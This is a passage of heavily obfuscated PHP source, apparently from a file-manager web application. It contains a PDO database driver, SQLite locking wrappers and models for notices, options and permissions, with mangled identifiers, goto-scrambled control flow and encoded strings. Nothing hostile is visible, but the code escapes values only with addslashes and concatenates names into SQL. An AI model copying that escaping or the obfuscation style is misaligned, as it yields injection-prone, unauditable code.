$this->queryStr .= $EÍ∞ÉŸ‹Ûá[843] . print_r($c∑îöÈàËÎ, !0) . $EÍ∞ÉŸ‹Ûá[844]; } $DáÊêàÏ…í = !1; goto dÑâ√”ç’‡; B”∞êåÁ™à: $EÍ∞ÉŸ‹Ûá =& $_SERVER[—Ω]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aãﬁ¥ıûÊ; f÷”Ïó…áÍ: think_status($EÍ∞ÉŸ‹Ûá[20]); $this->PDOStatement = $this->_linkID->prepare($bËÍà‘âêâ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto c›æíù„°ƒ; c›æíù„°ƒ: $fÃ”≤†úØ÷ = $this->PDOStatement->execute($c∑îöÈàËÎ); $this->debug(); if (!1 === $fÃ”≤†úØ÷) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($DáÊêàÏ…í || preg_match($EÍ∞ÉŸ‹Ûá[849], $bËÍà‘âêâ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto dÖÛà¢Ï´†; dÑâ√”ç’‡: if ($this->dbType == $EÍ∞ÉŸ‹Ûá[837]) { if (preg_match($EÍ∞ÉŸ‹Ûá[845], $this->queryStr, $b∞Ñ…ÔÔ≈€)) { $this->table = think_config($EÍ∞ÉŸ‹Ûá[846]) . str_ireplace(think_config($EÍ∞ÉŸ‹Ûá[847]), $EÍ∞ÉŸ‹Ûá[358], $b∞Ñ…ÔÔ≈€[2]); $DáÊêàÏ…í = (bool) $this->query($EÍ∞ÉŸ‹Ûá[848] . strtoupper($this->table) . $EÍ∞ÉŸ‹Ûá[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($EÍ∞ÉŸ‹Ûá[21], 1); goto f÷”Ïó…áÍ; dÖÛà¢Ï´†: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aÀ≤∂ü√Œ‹ = $this->_linkID->commit(); $this->transTimes = 0; if (!$aÀ≤∂ü√Œ‹) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $cÑ‹⁄‰â„∫ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$cÑ‹⁄‰â„∫) { $this->error(); return !1; } } return !0; } private function getAll() { $A≠€ø‰£∏‹ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($A≠€ø‰£∏‹); return $A≠€ø‰£∏‹; } public function getFields($A¢â¢ŸΩ˜—) { goto D¨ÇÂ¯Â‚µ; D·˜˜§¥ü≤: $Dé—óòÇæ∆ = $this->query($Eù∑éºèìá); $eÙÀ„ËÈ±ﬁ = array(); if ($Dé—óòÇæ∆) { foreach ($Dé—óòÇæ∆ as $EΩç¯»ÊÎ« => $D¨≤ÑÆÉ‰ó) { $D¨≤ÑÆÉ‰ó = array_change_key_case($D¨≤ÑÆÉ‰ó); $D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[28]] = isset($D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[28]]) ? $D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[28]] : $eîŒ‰≥Ûﬁı[358]; $D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[29]] = isset($D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[29]]) ? $D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[29]] : $eîŒ‰≥Ûﬁı[358]; $e≠Ñúó™Ú¡ = isset($D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[258]]) ? $D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[258]] : $D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[28]]; $eÙÀ„ËÈ±ﬁ[$e≠Ñúó™Ú¡] = array($eîŒ‰≥Ûﬁı[28] => $e≠Ñúó™Ú¡, $eîŒ‰≥Ûﬁı[29] => $D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[29]], $eîŒ‰≥Ûﬁı[31] => (bool) (isset($D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[101]]) && $D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[101]] === $eîŒ‰≥Ûﬁı[33] || isset($D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[31]]) && $D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[31]] === $eîŒ‰≥Ûﬁı[33]), $eîŒ‰≥Ûﬁı[34] => isset($D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[34]]) ? $D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[34]] : (isset($D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[53]]) ? $D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[53]] : $eîŒ‰≥Ûﬁı[358]), $eîŒ‰≥Ûﬁı[36] => isset($D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[89]]) ? strtolower($D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[89]]) == $eîŒ‰≥Ûﬁı[38] : (isset($D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[54]]) ? $D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[54]] : !1), $eîŒ‰≥Ûﬁı[39] => isset($D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[866]]) ? strtolower($D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[866]]) == $eîŒ‰≥Ûﬁı[41] : (isset($D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[89]]) ? $D¨≤ÑÆÉ‰ó[$eîŒ‰≥Ûﬁı[89]] : !1)); } } goto D˘¬ô¬„Ωì; D˘¬ô¬„Ωì: return $eÙÀ„ËÈ±ﬁ; goto eªã≥ìó“´; D¨ÇÂ¯Â‚µ: $eîŒ‰≥Ûﬁı =& $_SERVER[—Ω]; $this->initConnect(!0); if (think_config($eîŒ‰≥Ûﬁı[850])) { $Eù∑éºèìá = str_replace($eîŒ‰≥Ûﬁı[851], $A¢â¢ŸΩ˜—, think_config($eîŒ‰≥Ûﬁı[850])); } else { switch ($this->dbType) { case $eîŒ‰≥Ûﬁı[834]: case $eîŒ‰≥Ûﬁı[852]: $Eù∑éºèìá = "\123\105\x4c\x45\x43\x54\x20\x20\x20\x63\x6f\x6c\165\155\x6e\x5f\x6e\141\155\x65\x20\x61\x73\40\x27\x4e\x61\x6d\145\x27\x2c\40\40\40\144\141\x74\141\x5f\x74\171\160\x65\x20\x61\163\40\x27\124\x79\x70\145\47\54\x20\x20\x20\143\x6f\154\x75\155\x6e\x5f\144\x65\x66\141\165\154\164\x20\x61\x73\40\47\104\x65\x66\141\165\154\164\47\x2c\x20\x20\40\x69\x73\137\156\165\x6c\x6c\x61\142\x6c\145\x20\141\x73\x20\x27\x4e\x75\154\x6c\47\xa\x9\x9\x46\122\x4f\x4d\11\151\x6e\146\x6f\x72\x6d\x61\x74\151\157\x6e\137\163\143\x68\145\x6d\x61\56\164\x61\x62\154\x65\163\x20\x41\123\40\x74\12\x9\11\112\x4f\x49\116\11\x69\x6e\146\x6f\x72\x6d\141\x74\151\x6f\156\137\x73\143\x68\x65\155\141\x2e\x63\157\x6c\x75\x6d\x6e\x73\40\101\x53\x20\143\12\x9\x9\x4f\x4e\40\x20\164\56\164\141\142\154\x65\x5f\143\141\x74\x61\x6c\157\x67\40\x3d\x20\x63\x2e\164\x61\142\154\145\x5f\x63\141\x74\141\x6c\157\x67\xa\11\x9\101\x4e\104\x20\164\x2e\x74\141\x62\x6c\145\137\163\143\150\x65\155\141\40\75\x20\x63\x2e\164\x61\142\154\x65\137\x73\143\150\145\155\141\12\11\11\101\116\104\40\164\56\x74\141\142\x6c\x65\x5f\x6e\x61\x6d\145\x20\x3d\40\143\56\x74\x61\x62\154\145\x5f\156\x61\155\x65\xa\x9\11\x57\110\x45\x52\x45\40\x20\40\x74\x2e\164\141\142\154\x65\137\x6e\141\x6d\x65\x20\x3d\40\47{$A¢â¢ŸΩ˜—}\x27"; break; case $eîŒ‰≥Ûﬁı[853]: $Eù∑éºèìá = $eîŒ‰≥Ûﬁı[854] . $A¢â¢ŸΩ˜— . $eîŒ‰≥Ûﬁı[855]; break; case $eîŒ‰≥Ûﬁı[835]: case $eîŒ‰≥Ûﬁı[837]: $Eù∑éºèìá = $eîŒ‰≥Ûﬁı[856] . $eîŒ‰≥Ûﬁı[857] . $eîŒ‰≥Ûﬁı[858] . strtoupper($A¢â¢ŸΩ˜—) . $eîŒ‰≥Ûﬁı[859] . strtoupper($A¢â¢ŸΩ˜—) . $eîŒ‰≥Ûﬁı[860]; break; case $eîŒ‰≥Ûﬁı[861]: $Eù∑éºèìá = $eîŒ‰≥Ûﬁı[862] . $A¢â¢ŸΩ˜— . $eîŒ‰≥Ûﬁı[863]; break; case $eîŒ‰≥Ûﬁı[836]: break; case $eîŒ‰≥Ûﬁı[864]: default: $Eù∑éºèìá = $eîŒ‰≥Ûﬁı[865] . ($this->dbType == $eîŒ‰≥Ûﬁı[864] ? "\x60{$A¢â¢ŸΩ˜—}\x60" : $A¢â¢ŸΩ˜—); } } goto D·˜˜§¥ü≤; eªã≥ìó“´: } public function getTables($a‰§ÑçÎœÏ = '') { $bê‹é…Üœ =& $_SERVER[—Ω]; if (think_config($bê‹é…Üœ[867])) { $Dã∆©‘ΩºÌ = str_replace($bê‹é…Üœ[868], $a‰§ÑçÎœÏ, think_config($bê‹é…Üœ[867])); } else { switch ($this->dbType) { case $bê‹é…Üœ[835]: case $bê‹é…Üœ[837]: $Dã∆©‘ΩºÌ = $bê‹é…Üœ[869]; break; case $bê‹é…Üœ[834]: case $bê‹é…Üœ[852]: $Dã∆©‘ΩºÌ = $bê‹é…Üœ[870]; break; case $bê‹é…Üœ[861]: $Dã∆©‘ΩºÌ = $bê‹é…Üœ[871]; break; case $bê‹é…Üœ[836]: think_exception(think_lang($bê‹é…Üœ[872]) . $bê‹é…Üœ[873]); break; case $bê‹é…Üœ[853]: $Dã∆©‘ΩºÌ = $bê‹é…Üœ[42] . $bê‹é…Üœ[43] . $bê‹é…Üœ[44]; break; case $bê‹é…Üœ[864]: default: if (!empty($a‰§ÑçÎœÏ)) { $Dã∆©‘ΩºÌ = $bê‹é…Üœ[817] . $a‰§ÑçÎœÏ; } else { $Dã∆©‘ΩºÌ = $bê‹é…Üœ[818]; } } } $e†∞Ú≈‹èç = $this->query($Dã∆©‘ΩºÌ); $aﬂòÉÒâàà = array(); foreach ($e†∞Ú≈‹èç as $EÖóâÛ°´” => $e€ÆàêÿÍ) { $aﬂòÉÒâàà[$EÖóâÛ°´”] = current($e€ÆàêÿÍ); } return $aﬂòÉÒâàà; } protected function parseLimit($E∆¢¢êê®ã) { $còí≠ã‡∑⁄ =& $_SERVER[—Ω]; $CÑ„óàëÔÚ = $còí≠ã‡∑⁄[33]; if (!empty($E∆¢¢êê®ã)) { switch ($this->dbType) { case $còí≠ã‡∑⁄[861]: case $còí≠ã‡∑⁄[853]: $E∆¢¢êê®ã = explode($còí≠ã‡∑⁄[47], $E∆¢¢êê®ã); if (count($E∆¢¢êê®ã) > 1) { $CÑ„óàëÔÚ .= $còí≠ã‡∑⁄[48] . $E∆¢¢êê®ã[1] . $còí≠ã‡∑⁄[49] . $E∆¢¢êê®ã[0] . $còí≠ã‡∑⁄[50]; } else { $CÑ„óàëÔÚ .= $còí≠ã‡∑⁄[48] . $E∆¢¢êê®ã[0] . $còí≠ã‡∑⁄[50]; } break; case $còí≠ã‡∑⁄[834]: case $còí≠ã‡∑⁄[852]: break; case $còí≠ã‡∑⁄[836]: break; case $còí≠ã‡∑⁄[835]: case $còí≠ã‡∑⁄[837]: break; case $còí≠ã‡∑⁄[864]: default: $CÑ„óàëÔÚ .= $còí≠ã‡∑⁄[48] . $E∆¢¢êê®ã . $còí≠ã‡∑⁄[50]; } } return $CÑ„óàëÔÚ; } public function parseKey(&$CßçñÁÿÑë, $f©í…÷´Ñç = true) { $BñÌ¢öÊ∑ù =& $_SERVER[—Ω]; if ($f©í…÷´Ñç) { $CßçñÁÿÑë = $this->parseKeyCheck($CßçñÁÿÑë); } if ($this->dbType == $BñÌ¢öÊ∑ù[864]) { if ($CßçñÁÿÑë != $BñÌ¢öÊ∑ù[173] && !preg_match($BñÌ¢öÊ∑ù[828], $CßçñÁÿÑë)) { $CßçñÁÿÑë = $BñÌ¢öÊ∑ù[829] . trim($CßçñÁÿÑë, $BñÌ¢öÊ∑ù[829]) . $BñÌ¢öÊ∑ù[829]; } return $CßçñÁÿÑë; } else { return parent::parseKey($CßçñÁÿÑë); } } public function close() { $this->_linkID = null; } public function error() { $E•≤‚©Ùøî =& $_SERVER[—Ω]; if ($this->PDOStatement) { $eì¶ú÷∑⁄Œ = $this->PDOStatement->errorInfo(); $this->error = $eì¶ú÷∑⁄Œ[1] . $E•≤‚©Ùøî[4] . $eì¶ú÷∑⁄Œ[2]; } else { $this->error = $E•≤‚©Ùøî[33]; } if ($E•≤‚©Ùøî[33] != $this->queryStr) { $this->error .= LNG($E•≤‚©Ùøî[45]) . $this->queryStr; } think_trace($this->error, $E•≤‚©Ùøî[33], $E•≤‚©Ùøî[46]); return $this->error; } public function escapeString($BØ†øıÇÒá) { $CƒÑÈ¶ Ö… =& $_SERVER[—Ω]; switch ($this->dbType) { case $CƒÑÈ¶ Ö…[861]: case $CƒÑÈ¶ Ö…[834]: case $CƒÑÈ¶ Ö…[852]: case $CƒÑÈ¶ Ö…[864]: return addslashes($BØ†øıÇÒá); case $CƒÑÈ¶ Ö…[836]: case $CƒÑÈ¶ Ö…[853]: case $CƒÑÈ¶ Ö…[835]: case $CƒÑÈ¶ Ö…[837]: return str_ireplace($CƒÑÈ¶ Ö…[55], $CƒÑÈ¶ Ö…[56], $BØ†øıÇÒá); } } protected function parseValue($c¥“âàﬂ¯Ø) { $A¡‰Ñ¬†¯û =& $_SERVER[—Ω]; if (is_string($c¥“âàﬂ¯Ø)) { $c¥“âàﬂ¯Ø = strpos($c¥“âàﬂ¯Ø, $A¡‰Ñ¬†¯û[4]) === 0 ? $this->escapeString($c¥“âàﬂ¯Ø) : $A¡‰Ñ¬†¯û[874] . $this->escapeString($c¥“âàﬂ¯Ø) . $A¡‰Ñ¬†¯û[874]; } elseif (isset($c¥“âàﬂ¯Ø[0]) && is_string($c¥“âàﬂ¯Ø[0]) && strtolower($c¥“âàﬂ¯Ø[0]) == $A¡‰Ñ¬†¯û[282]) { $c¥“âàﬂ¯Ø = $this->escapeString($c¥“âàﬂ¯Ø[1]); } elseif (is_array($c¥“âàﬂ¯Ø)) { $c¥“âàﬂ¯Ø = array_map(array($this, $A¡‰Ñ¬†¯û[875]), $c¥“âàﬂ¯Ø); } elseif (is_bool($c¥“âàﬂ¯Ø)) { $c¥“âàﬂ¯Ø = $c¥“âàﬂ¯Ø ? $A¡‰Ñ¬†¯û[83] : $A¡‰Ñ¬†¯û[464]; } elseif (is_null($c¥“âàﬂ¯Ø)) { $c¥“âàﬂ¯Ø = $A¡‰Ñ¬†¯û[101]; } return $c¥“âàﬂ¯Ø; } public function getLastInsertId() { $c∂¬ﬂ¿…ÿÁ =& $_SERVER[—Ω]; switch ($this->dbType) { case $c∂¬ﬂ¿…ÿÁ[861]: case $c∂¬ﬂ¿…ÿÁ[853]: case $c∂¬ﬂ¿…ÿÁ[834]: case $c∂¬ﬂ¿…ÿÁ[852]: case $c∂¬ﬂ¿…ÿÁ[836]: case $c∂¬ﬂ¿…ÿÁ[864]: return $this->_linkID->lastInsertId(); case $c∂¬ﬂ¿…ÿÁ[835]: case $c∂¬ﬂ¿…ÿÁ[837]: $DàùŒüêç‘ = $this->table; $B∫åñÌ≠‰ç = $this->query("\123\x45\114\x45\103\124\40{$DàùŒüêç‘}\x2e\x63\165\162\x72\x76\x61\x6c\x20\143\x75\x72\x72\x76\141\154\x20\x46\x52\x4f\x4d\x20\x64\x75\x61\154"); return $B∫åñÌ≠‰ç ? $B∫åñÌ≠‰ç[0][$c∂¬ﬂ¿…ÿÁ[876]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($bÂ√Á˘≠ò©) { goto FâÂóùÂ±ı; FâÂóùÂ±ı: $DË¥À‘Àﬂ£ =& $_SERVER[—Ω]; $FßŒµéóŸ≤ = DATA_PATH . $DË¥À‘Àﬂ£[877]; $BŸù—É›„ú = fopen($FßŒµéóŸ≤, $DË¥À‘Àﬂ£[878]); goto cùΩ”‘Ê◊ã; Cüµ„¨ÿ®Ï: fclose($BŸù—É›„ú); show_json($DË¥À‘Àﬂ£[879], !1); return !1; goto A≥—àœë»Ω; cùΩ”‘Ê◊ã: if (!$BŸù—É›„ú) { return !1; } if (flock($BŸù—É›„ú, LOCK_EX)) { $Bø©Ü¶Ûº∞ = parent::query($bÂ√Á˘≠ò©); flock($BŸù—É›„ú, LOCK_UN); fclose($BŸù—É›„ú); return $Bø©Ü¶Ûº∞; } flock($BŸù—É›„ú, LOCK_UN); goto Cüµ„¨ÿ®Ï; A≥—àœë»Ω: } public function execute($Aµ◊†±¥Ï¡) { goto e°ûêÇú§π; bÊ•≠ÉÊÑå: fclose($A‰’‘¯ÒõÆ); show_json($eìé¡üÔ√Ù[879], !1); return !1; goto Fö€Ë¶Ï≈£; e°ûêÇú§π: $eìé¡üÔ√Ù =& $_SERVER[—Ω]; $AÔÛŸü”Ïª = DATA_PATH . $eìé¡üÔ√Ù[877]; $A‰’‘¯ÒõÆ = fopen($AÔÛŸü”Ïª, $eìé¡üÔ√Ù[878]); goto b©ÿ¬—ΩôÇ; b©ÿ¬—ΩôÇ: if (!$A‰’‘¯ÒõÆ) { return !1; } if (flock($A‰’‘¯ÒõÆ, LOCK_EX)) { $Dê≤Ã¥Ÿ«£ = parent::execute($Aµ◊†±¥Ï¡); flock($A‰’‘¯ÒõÆ, LOCK_UN); fclose($A‰’‘¯ÒõÆ); return $Dê≤Ã¥Ÿ«£; } flock($A‰’‘¯ÒõÆ, LOCK_UN); goto bÊ•≠ÉÊÑå; Fö€Ë¶Ï≈£: } } class DbSqlite3 extends DbSqlite3Base { public function query($b√ÆäŒôˆƒ) { goto dö√¡Ã©»≈; Cù◊ﬁ·ä◊≠: fclose($aË∂‚£π‰Ã); show_json($Bëƒ·ﬂü™±[879], !1); return !1; goto a”•©É…æÊ; dö√¡Ã©»≈: $Bëƒ·ﬂü™± =& $_SERVER[—Ω]; $E‚ﬁ©‰≥Ù = DATA_PATH . $Bëƒ·ﬂü™±[877]; $aË∂‚£π‰Ã = fopen($E‚ﬁ©‰≥Ù, $Bëƒ·ﬂü™±[878]); goto CëèÒæí¡ó; CëèÒæí¡ó: if (!$aË∂‚£π‰Ã) { return !1; } if (flock($aË∂‚£π‰Ã, LOCK_EX)) { $FÙÁ§ﬂõËÌ = parent::query($b√ÆäŒôˆƒ); flock($aË∂‚£π‰Ã, LOCK_UN); fclose($aË∂‚£π‰Ã); return $FÙÁ§ﬂõËÌ; } flock($aË∂‚£π‰Ã, LOCK_UN); goto Cù◊ﬁ·ä◊≠; a”•©É…æÊ: } public function execute($EæÇÚ≤«’Ö) { goto b∑º≈˜ß˘√; E©Ï∞¿¡∫¬: fclose($cÒö√˜Ç’ﬁ); show_json($cŒâõ‡ˆº«[879], !1); return !1; goto e⁄©ÌéΩ±‰; AòﬁØ∏ìÖá: if (!$cÒö√˜Ç’ﬁ) { return !1; } if (flock($cÒö√˜Ç’ﬁ, LOCK_EX)) { $eòê€®ßÎˆ = parent::execute($EæÇÚ≤«’Ö); flock($cÒö√˜Ç’ﬁ, LOCK_UN); fclose($cÒö√˜Ç’ﬁ); return $eòê€®ßÎˆ; } flock($cÒö√˜Ç’ﬁ, LOCK_UN); goto E©Ï∞¿¡∫¬; b∑º≈˜ß˘√: $cŒâõ‡ˆº« =& $_SERVER[—Ω]; $CíÍÑÂ⁄¢Û = DATA_PATH . $cŒâõ‡ˆº«[877]; $cÒö√˜Ç’ﬁ = fopen($CíÍÑÂ⁄¢Û, $cŒâõ‡ˆº«[878]); goto AòﬁØ∏ìÖá; e⁄©ÌéΩ±‰: } } goto fÈƒÀõâ≠º; déíññèèå: define($_SERVER[—Ω][1908], 1); define($_SERVER[—Ω][1909], 2); define($_SERVER[—Ω][1910], 3); goto f¥¬ãıßπ›; BÇÔÕãö§˜: function beforeShutdown() { Hook::trigger($_SERVER[ªƒÓ™éå][36]); } $_SERVER[$_SERVER[ªƒÓ™éå][37]] = BASIC_PATH; $_SERVER[$_SERVER[ªƒÓ™éå][38]] = LIB_DIR; goto bê¥ÿÇ√øò; e„Û®É≤‡: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\156\157\x74\151\x63\x65\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\143\157\x6e\164\145\x6e\164", "\x61\x75\x74\x68", "\x6d\x6f\144\x65", "\x74\151\155\x65", "\164\x79\160\x65", "\154\145\166\145\x6c", "\145\156\x61\x62\154\145", "\x73\x6f\x72\x74"); public function listData($BÍ‰ËüÑá£ = false, $c≤⁄‚ç±ÿô = "\x73\x6f\162\x74", $FÂ±≤Çüﬁà = false) { return parent::listData($BÍ‰ËüÑá£, $c≤⁄‚ç±ÿô, $FÂ±≤Çüﬁà); } public function add($fãæ§“≠”ô) { goto aﬁ≤öºâ¢≥; c‹ˆ–Ìêá»: $A÷ÛÑ∑ƒò = time(); if ($fãæ§“≠”ô[$Døä›ê‰êë[12]] == $Døä›ê‰êë[2439]) { $A÷ÛÑ∑ƒò = strtotime($fãæ§“≠”ô[$Døä›ê‰êë[187]]); } $fãæ§“≠”ô[$Døä›ê‰êë[187]] = $A÷ÛÑ∑ƒò; goto a»„ñåÏ¿Ê; aﬁ≤öºâ¢≥: $Døä›ê‰êë =& $_SERVER[—Ω]; $aéãêÜÇ˜ = $this->findByName($fãæ§“≠”ô[$Døä›ê‰êë[28]]); if ($aéãêÜÇ˜) { return !1; } goto c‹ˆ–Ìêá»; a»„ñåÏ¿Ê: return parent::insert($fãæ§“≠”ô); goto fÆ‰ı—¡ƒ∑; fÆ‰ı—¡ƒ∑: } public function update($e“Í≈“±Ó—, $Bû‰Öãﬁ≥«) { goto D≠é–Çì˘¥; D≠é–Çì˘¥: $eÚË˘∞€ïΩ =& $_SERVER[—Ω]; $eÜØÀ÷Ê‹Ã = $this->listData($e“Í≈“±Ó—); $CÁû≥∂ãÿê = $this->findByName($Bû‰Öãﬁ≥«[$eÚË˘∞€ïΩ[28]]); goto bÑﬁì §çö; BÒ≤ÏÚ∫¯É: $Bû‰Öãﬁ≥«[$eÚË˘∞€ïΩ[187]] = $b‚πß∑Ãπâ; return parent::update($e“Í≈“±Ó—, $Bû‰Öãﬁ≥«); goto b¢ÖÑåË€¡; bÑﬁì §çö: if (!$eÜØÀ÷Ê‹Ã || $CÁû≥∂ãÿê && $CÁû≥∂ãÿê[$eÚË˘∞€ïΩ[364]] != $eÜØÀ÷Ê‹Ã[$eÚË˘∞€ïΩ[364]]) { return !1; } $b‚πß∑Ãπâ = time(); if ($Bû‰Öãﬁ≥«[$eÚË˘∞€ïΩ[12]] == $eÚË˘∞€ïΩ[2439]) { $b‚πß∑Ãπâ = strtotime($Bû‰Öãﬁ≥«[$eÚË˘∞€ïΩ[187]]); } goto BÒ≤ÏÚ∫¯É; b¢ÖÑåË€¡: } public function remove($A°ºìßåõÚ) { $a€¯ƒ±“É‚ = $this->listData($A°ºìßåõÚ); if (!$a€¯ƒ±“É‚ || $a€¯ƒ±“É‚[$_SERVER[—Ω][1084]]) { return !1; } return parent::remove($A°ºìßåõÚ); } public function sort($FÕ»Ÿè®§∫, $BçÒÜùπÂ†) { return parent::update($FÕ»Ÿè®§∫, $BçÒÜùπÂ†); } public function enable($eå∆¨Çµ´é, $Fë†‘ÿ˜¬¢) { return parent::update($eå∆¨Çµ´é, array($_SERVER[—Ω][2440] => $Fë†‘ÿ˜¬¢)); } private function initUserOption() { $Cå¢∞ÇÊò— =& $_SERVER[—Ω]; $this->optionType = $Cå¢∞ÇÊò—[2441]; $this->modelType = $Cå¢∞ÇÊò—[2442]; $this->field = array($Cå¢∞ÇÊò—[2443], $Cå¢∞ÇÊò—[28], $Cå¢∞ÇÊò—[187], $Cå¢∞ÇÊò—[29], $Cå¢∞ÇÊò—[2444], $Cå¢∞ÇÊò—[699], $Cå¢∞ÇÊò—[180]); } public function userNoticeGet($Eª¯ﬂ¯ÇΩÖ = false) { $this->initUserOption(); return parent::listData($Eª¯ﬂ¯ÇΩÖ, $_SERVER[—Ω][364], !0); } public function userNoticeAdd($EÉú¡œı¶ ) { $d…ëõµ‹¨û =& $_SERVER[—Ω]; $this->initUserOption(); $F˘∫áÖ¿ﬂë = $this->findByKey($d…ëõµ‹¨û[2443], $EÉú¡œı¶ [$d…ëõµ‹¨û[364]]); if ($F˘∫áÖ¿ﬂë) { return !0; } $B…£º›≠Ì‚ = array($d…ëõµ‹¨û[2443] => $EÉú¡œı¶ [$d…ëõµ‹¨û[364]], $d…ëõµ‹¨û[28] => $EÉú¡œı¶ [$d…ëõµ‹¨û[28]], $d…ëõµ‹¨û[187] => $EÉú¡œı¶ [$d…ëõµ‹¨û[187]], $d…ëõµ‹¨û[29] => isset($EÉú¡œı¶ [$d…ëõµ‹¨û[29]]) ? $EÉú¡œı¶ [$d…ëõµ‹¨û[29]] : 1, $d…ëõµ‹¨û[2444] => isset($EÉú¡œı¶ [$d…ëõµ‹¨û[2444]]) ? $EÉú¡œı¶ [$d…ëõµ‹¨û[2444]] : 0, $d…ëõµ‹¨û[699] => 0, $d…ëõµ‹¨û[180] => 0); return parent::insert($B…£º›≠Ì‚); } public function userNoticeEdit($bµ–§å◊Èç, $f£§Öç™ŸÑ) { $this->initUserOption(); return parent::update($bµ–§å◊Èç, $f£§Öç™ŸÑ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\x65\155\x5f\157\160\x74\151\157\156"; protected $jsonField = array("\x6d\x65\x6e\165", "\162\157\154\145", "\x72\x6f\x6c\x65\x47\x72\157\x75\x70", "\162\x65\147\151\x73\x74", "\145\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($a¨àÙèô∆√) { return "\x53\171\x73\x74\145\x6d\117\x70\x74\x69\x6f\x6e\x5f{$a¨àÙèô∆√}"; } protected function optionDefault($A¢ùáå∑ÿí = '') { $fà¥π†≠óÙ =& $_SERVER[—Ω]; if ($A¢ùáå∑ÿí == $fà¥π†≠óÙ[33]) { return $GLOBALS[$fà¥π†≠óÙ[6]][$fà¥π†≠óÙ[2445]]; } } } class SystemRecordModel extends ModelBaseLight { } goto d”Æêœºç‚; Bò≈…ã“ª»: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\x72\x63\145\137\141\x75\164\x68"; public function getAuth($B˜‹Óòµä‚) { goto A€’Â≈ÆÕ§; A€’Â≈ÆÕ§: $C€ÛÎÉ†ìø =& $_SERVER[—Ω]; $Bè†»™Îæ⁄ = $C€ÛÎÉ†ìø[2226]; $Fπ†≈ò°®§ = array($C€ÛÎÉ†ìø[366] => $B˜‹Óòµä‚); goto aﬁÑﬂÔÿ¨; a¡∂õ≠„π‰: return $dø€Á˜øÂÛ; goto Dü—Ø»ª–ı; aﬁÑﬂÔÿ¨: $Eê‘Œ∆öÿ— = $this->field($Bè†»™Îæ⁄)->order($C€ÛÎÉ†ìø[364])->where($Fπ†≈ò°®§)->select(); $dø€Á˜øÂÛ = array(); foreach ($Eê‘Œ∆öÿ— as $f¯™≤ıﬁœ÷) { if (Model($C€ÛÎÉ†ìø[2227])->listData($f¯™≤ıﬁœ÷[$C€ÛÎÉ†ìø[2208]])) { $dø€Á˜øÂÛ[] = $f¯™≤ıﬁœ÷; } } goto a¡∂õ≠„π‰; Dü—Ø»ª–ı: } public function setAuth($fê∏âŒ≠åé, $aûïŸœ¿œÒ) { goto d„›∏ˆÓ®≤; d„›∏ˆÓ®≤: $AÂ∞Ó¥Ó°˘ =& $_SERVER[—Ω]; $déó¡°›é¯ = Model($AÂ∞Ó¥Ó°˘[1114])->sourceInfo($fê∏âŒ≠åé); if ($déó¡°›é¯[$AÂ∞Ó¥Ó°˘[368]] != SourceModel::TYPE_GROUP) { return !1; } goto E≤∑√û§Æ; aï‰Ú“É∆Ç: $A◊‡æ›»Ùò = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $a∑≠‘äµ‹¢ = array(); foreach ($aûïŸœ¿œÒ as $bøåÍ ∞õœ) { if (!in_array($bøåÍ ∞õœ[$AÂ∞Ó¥Ó°˘[368]], $A◊‡æ›»Ùò)) { show_json(LNG($AÂ∞Ó¥Ó°˘[2228]), !1); } if ($cë®áåâé’ != $f‹™ÇàÕ€…) { if ($bøåÍ ∞õœ[$AÂ∞Ó¥Ó°˘[368]] == SourceModel::TYPE_GROUP) { } if ($bøåÍ ∞õœ[$AÂ∞Ó¥Ó°˘[452]] != 0 && !in_array($bøåÍ ∞õœ[$AÂ∞Ó¥Ó°˘[452]], $A€¨Ö’ÇŒ‹)) { } } if ($bøåÍ ∞õœ[$AÂ∞Ó¥Ó°˘[452]] == 0) { $bøåÍ ∞õœ[$AÂ∞Ó¥Ó°˘[368]] = SourceModel::TYPE_USER; } $a∑≠‘äµ‹¢[] = array($AÂ∞Ó¥Ó°˘[366] => $fê∏âŒ≠åé, 